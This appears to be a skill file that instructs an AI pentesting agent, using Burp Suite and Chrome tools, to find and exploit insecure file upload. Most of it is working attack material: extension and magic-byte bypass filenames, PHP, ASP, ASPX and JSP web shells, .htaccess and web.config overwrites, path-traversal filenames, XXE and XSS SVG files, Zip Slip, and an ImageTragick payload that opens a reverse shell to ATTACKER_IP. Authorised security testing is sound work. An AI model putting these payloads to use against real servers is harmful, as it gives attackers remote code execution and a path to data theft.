# File Upload Vulnerability Detection Skill

## Objective
Identify insecure file upload vulnerabilities that allow uploading malicious files leading to code execution or other attacks.

## Instructions

### 1. Identify Upload Functionality
Look for file upload endpoints:
- Profile picture uploads
- Document uploads
- Media uploads
- Import functionality
- Avatar/image uploads
- Resume/CV uploads
- Attachment features

### 2. Basic Upload Tests

**Test accepted file types:**
1. Upload legitimate file type
2. Try uploading .php, .asp, .jsp, .html
3. Note error messages and validation behavior

### 3. Extension Bypass Techniques

**Double extensions:**
```
shell.php.jpg
shell.jpg.php
shell.php.png
```

**Null byte (older systems):**
```
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png
```

**Case manipulation:**
```
shell.pHp
shell.PhP
shell.PHP
shell.pHP
```

**Alternative extensions:**
```
# PHP
.php, .php2, .php3, .php4, .php5, .php6, .php7, .pht, .phtm, .phtml
.phps, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

# ASP
.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml
.rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml

# JSP
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

# Perl
.pl, .pm, .cgi, .lib

# Other
.cfm, .cfml, .cfc, .dbm, .swf
```

**Special characters:**
```
shell.php.....
shell.php%20
shell.php%0a
shell.php%0d%0a
shell.php/
shell.php.\
shell.php;.jpg
```

### 4. Content-Type Manipulation

**Change Content-Type header:**
```http
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

While uploading:
```
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### 5. Magic Bytes Bypass

**Add valid image header:**
```php
GIF89a<?php system($_GET['cmd']); ?>
```

```php
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
```

```php
\xFF\xD8\xFF<?php system($_GET['cmd']); ?>
```

**Polyglot files:**
Create valid image that's also valid PHP/script.

### 6. Web Shell Payloads

**PHP web shells:**
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
<?=`$_GET[0]`?>
```

**ASP web shell:**
```asp
<%eval request("cmd")%>
```

**ASPX web shell:**
```aspx
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]);%>
```

**JSP web shell:**
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### 7. File Overwrite Attacks

**Overwrite .htaccess:**
```
AddType application/x-httpd-php .jpg
```
Then upload shell.jpg with PHP code.

**Overwrite web.config (IIS):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
   </system.webServer>
</configuration>
```

### 8. Path Traversal in Filename

**Upload to different directory:**
```
filename="../../../var/www/html/shell.php"
filename="....//....//....//var/www/html/shell.php"
filename="%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/www/html/shell.php"
```

### 9. XXE via File Upload

**SVG with XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX/XLSX XXE:**
Modify XML files inside the archive (unzip, modify, rezip).

### 10. XSS via File Upload

**SVG with XSS:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <text>test</text>
</svg>
```

**HTML file:**
```html
<html><body><script>alert('XSS')</script></body></html>
```

### 11. ImageMagick Exploitation

**ImageTragick (CVE-2016-3714):**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")'
pop graphic-context
```

### 12. ZIP-based Attacks

**Zip Slip:**
Create zip with path traversal:
```bash
zip shell.zip ../../../var/www/html/shell.php
```

**Zip bomb (DoS detection):**
Large compression ratio file.

### 13. Server-Side Processing Exploitation

**PDF generators:**
- Inject SSRF via images in uploaded documents
- XSS in PDF metadata

**Image processors:**
- ImageMagick vulnerabilities
- GhostScript vulnerabilities

### 14. Confirm and Document
If confirmed, create finding with:
- Upload endpoint
- Bypass technique used
- Shell/file uploaded
- Accessible URL
- Evidence (command execution)
- Impact assessment

## MCP Tools to Use

### BurpSuite
- `http1_request` / `http2_request`: Test uploads
- `repeater_tab_with_payload`: Manual testing
- `url_encode` / `base64_encode`: Encode filenames
- `collaborator_generate` / `collaborator_poll`: OOB verification

### Chrome
- `navigate_page`: Navigate to upload page
- `upload_file`: Upload test files through the browser
- `take_screenshot`: Capture evidence of uploaded file execution

## Keywords
file upload, upload vulnerability, unrestricted upload

## References
- PayloadsAllTheThings/Upload Insecure Files
- OWASP File Upload
- HackTricks File Upload
